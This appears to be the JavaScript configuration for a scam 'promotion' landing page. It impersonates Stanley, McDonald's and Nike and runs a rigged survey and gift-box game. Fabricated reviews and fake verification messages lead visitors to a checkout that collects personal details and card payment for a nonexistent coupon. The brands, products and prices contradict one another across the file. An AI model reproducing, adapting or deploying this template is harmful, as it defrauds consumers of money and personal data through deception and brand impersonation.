const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "en";
  const lang = "en-EN";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Size: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };
  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    text: `,
Congratulations!<br><br>
You participated in the Stanley promotion: you have the opportunity to buy the STANLEY QUENCHER H2.0 ice mold thermos for only <b>$37</b>!
`,
  };

  const notifications = [
    // {
    // 	user: "Manuel S*****",
    // 	location: "Barcelona, España",
    // 	action: "¡Acabo de recibir la joya por 1,95 euros!",
    // 	timeago: "hace 15 segundos",
    // },
    // {
    // 	user: "Carlos B******",
    // 	location: "Madrid, España",
    // 	action: "¡Acabo de recibir la joya por 1,95 euros!",
    // 	timeago: "hace 25 segundos",
    // },
  ];

  const reviewsArr = [
    {
      name: "Mateo",
      time: "A day ago",
      header: "It's incredible!",
      product: "26468782",
      review: "As a football fan for many years, I was very surprised by the quality of the Spain national team jersey at a very reasonable price 😊",
    },
    {
      name: "Lucas",
      time: "Two days ago",
      header: "Great! I have no words.",
      product: "26468789",
      review: "I decided to buy the Spain national team jersey for the first time and now I enjoy it every time I support my team, thank you.",
    },
    {
      name: "Valentina",
      time: "Two days ago",
      header: "Simply great.",
      product: "26468785",
      review: "The quality of the jersey is incredible, and the size is perfect! Thank you, I will recommend it to my friends.",
    },
    {
      name: "Santiago",
      time: "Four days ago",
      header: "I like it",
      review: "Honestly, I love watching football, and the new Spain national team jersey was exactly what I needed.",
    },
    {
      name: "Martina",
      time: "Seven days ago",
      header: "Wow, I love this product!",
      product: "26468784",
      review: "At first I thought the jersey was expensive, but fortunately, I bought it and now I enjoy the best matches with it. Thank you!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "REVIEWS AND RATINGS",
    percent: "99%",
    rec: "Comments on this promotion",
  };

  const questions = {
    _of: "Question {1} of {2}: ",
    arr: [
      {
        q: "Have you ever ordered McDonald's products?",
        a: [
          "Yes, I order frequently",
          "Yes, I order rarely",
          "I have never ordered",
        ],
      },
      {
        q: "Should McDonald's continue with this type of advertising campaigns?",
        a: ["Yes, of course!", "Yes, but change the promotional menu", "No"],
      },
      {
        q: "Would you recommend our products to your friends?",
        a: ["Yes", "No"],
      },
    ],
  };

  const check = {
    title: "Your answer will be reviewed",
    arr: [
      "You have answered question 3 of 3",
      "Your IP address does not show previous orders",
      "Your answer has been verified",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Thank you for participating in the survey!",
        button: "Try your luck",
        text: `
<center>
    To get the McDonald's promotional menu, you must choose the correct gift box.
    <br><br>
    You have 3 attempts, good luck!
</center>
            `,
      },
    },
    first: {
      texts: {
        header: "Oh, no...",
        button: "Try again",
        text: `
<center>
    Unfortunately, this gift is empty. You have two attempts left, good luck!
</center>
            `,
      },
    },
    win: {
      texts: {
        header: "England (Men's Team) 2024/25 Stadium Home",
        button: "Get the coupon",
        text: `
<center>
    <p style="color: #ffffff"></p>
    <br>
    Click "Get the coupon", complete the form and pay the order.
    <br><br>
    Receive a text message with the coupon and instructions to activate it.
    <br><br>
    The coupon can be activated at any time and does not require additional payment.
</center>
            `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Personal information",
      fields: {
        name: {
          enabled: true,
          field: "First Name",
        },
        family: {
          enabled: true,
          field: "Last Name",
        },
        phone: {
          enabled: true,
          field: "Phone Number",
        },
        email: {
          enabled: true,
          field: "Email Address",
        },
      },
    },
    delivery: {
      title: "Delivery",
      fields: {
        city: {
          enabled: true,
          field: "City",
        },
        address: {
          enabled: true,
          field: "Delivery Address",
        },
        zip: {
          enabled: true,
          field: "Postal Code",
        },
      },
    },
    payment: {
      title: "Payment Methods",
      creditCard: "Online payment by credit card",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Order Details",
      oldPrice: "€99.99",
      newPrice: "€9.99",
      size: "Size",
      subTotal: {
        title: "Subtotal",
        amount: "€9.99",
      },
      delivery: {
        title: "Delivery",
        amount: "€0.00",
      },
      total: {
        title: "Total",
        amount: "€9.99",
      },
      checkoutButton: "Pay your order",
    },
  };


  const products = [
    {
      id: "26468784",
      name: "England (Men's Team) 2024/25 Stadium Home",
      miniImg: "./src/img/shirt-en.jpg",
      images: ["./src/img/shirt-en.jpg"],
    },
    {
      id: "26468782",
      name: "England (Men's Team) 2024/25 Stadium Home",
      miniImg: "./src/img/shirt-en.jpg",
      images: ["./src/img/shirt-en.jpg"],
    },
    {
      id: "26468783",
      name: "England (Men's Team) 2024/25 Stadium Home",
      miniImg: "./src/img/shirt-en.jpg",
      images: ["./src/img/shirt-en.jpg"],
    },
  ];

  const footer = {
    cr: "©© 2024  Nike, Inc. All rights reserved",
  };

  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  // document
  //   .querySelector(".checkout_header")
  //   .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});